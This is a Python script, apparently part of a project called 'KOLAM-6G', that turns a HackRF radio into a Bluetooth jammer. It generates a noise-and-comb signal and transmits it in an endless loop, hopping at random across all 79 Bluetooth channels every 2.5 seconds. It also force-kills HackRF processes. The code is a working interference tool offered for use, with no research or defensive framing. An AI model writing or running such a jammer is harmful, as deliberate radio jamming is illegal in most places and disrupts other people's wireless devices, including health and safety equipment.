
import os
import sys
import time
import numpy as np
import subprocess
import hashlib
import hmac
import struct

# Add project root to path
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from backend.hackrf_bridge import HackRFBridge

def generate_hybrid_seed(master_secret: str = "KOLAM_6G_JAMMER"):
    source1 = master_secret.encode()
    source2 = str(time.time_ns()).encode()
    source3 = os.urandom(32)
    combined = source1 + b":" + source2 + b":" + source3
    return hashlib.sha256(combined).digest()

def get_kolam_next_freq(seed: bytes, counter: int, channels: list):
    msg = struct.pack(">Q", counter)
    h = hmac.new(seed, msg, hashlib.sha256).digest()
    val = int.from_bytes(h[:4], "big")
    return channels[val % len(channels)]

def generate_kolam_jam_signal(sample_rate=10000000):
    """
    Generates a 1-second high-entropy Kolam block.
    Multi-tone comb + Gaussian noise.
    """
    num_samples = sample_rate # 1 second at 10Msps
    t = np.arange(num_samples) / sample_rate
    
    # Base Noise
    noise = (np.random.normal(0, 0.4, num_samples) + 1j * np.random.normal(0, 0.4, num_samples))
    
    # 5 Frequency Spikes to hit multiple BT channels at once
    offsets = [-4e6, -2e6, 0, 2e6, 4e6]
    comb = np.zeros(num_samples, dtype=complex)
    for off in offsets:
        jitter = np.exp(1j * np.random.uniform(0, 2*np.pi, num_samples))
        carrier = np.exp(1j * 2 * np.pi * off * t)
        comb += carrier * jitter * 0.2
        
    return comb + noise

def run_kolam_dominance():
    print("--- INITIATING PROCESS MASSACRE ---")
    os.system("taskkill /F /IM hackrf_transfer.exe /T")
    os.system("taskkill /F /IM hackrf_info.exe /T")
    time.sleep(1)

    bridge = HackRFBridge()
    
    print("\n[KOLAM-6G] Generating Master Kolam Jam-Block...")
    samples = generate_kolam_jam_signal(10000000) # 1s buffer
    iq_path = os.path.abspath("kolam_nuclear.c8")
    bridge.save_to_file(samples.tolist(), filename=iq_path)

    # All 79 BT Channels for "Many Random Frequencies"
    bt_channels = [int(2402e6 + (i * 1e6)) for i in range(79)]
    
    print("\n" + "!"*50)
    print("   KOLAM-6G: STABLE BT-JAMMER ACTIVE")
    print("!"*50)
    print("DWELL TIME: 2.5 Seconds")
    print("GAIN: 25 (Stability Mode)")
    print("!"*50)

    hop_count = 0
    try:
        while True:
            # Randomly select from the 79 channels
            freq = np.random.choice(bt_channels)
            
            print(f"\n[HOP {hop_count}] JUMPING TO: {freq/1e6} MHz")
            
            # Use lower power and lower sample rate to prevent USB brown-outs
            cmd = [
                bridge.tool_path,
                "-t", iq_path,
                "-f", str(int(freq)),
                "-s", "8000000",  # Lower rate = Lower USB power drain
                "-a", "0",       # Amp OFF for stability
                "-x", "25",      # Moderate Gain
                "-n", "20000000"  # ~2.5 seconds of data
            ]
            
            # Start Transmission
            proc = subprocess.Popen(cmd)
            
            # Dwell for 2.5 seconds
            time.sleep(2.5)
            
            # Cleanly terminate
            try:
                proc.terminate()
                proc.wait(timeout=1.0)
            except:
                os.system("taskkill /F /IM hackrf_transfer.exe /T >nul 2>&1")
                
            hop_count += 1
            
    except KeyboardInterrupt:
        os.system("taskkill /F /IM hackrf_transfer.exe /T")
        print("\nJammer Stopped.")

if __name__ == "__main__":
    run_kolam_dominance()
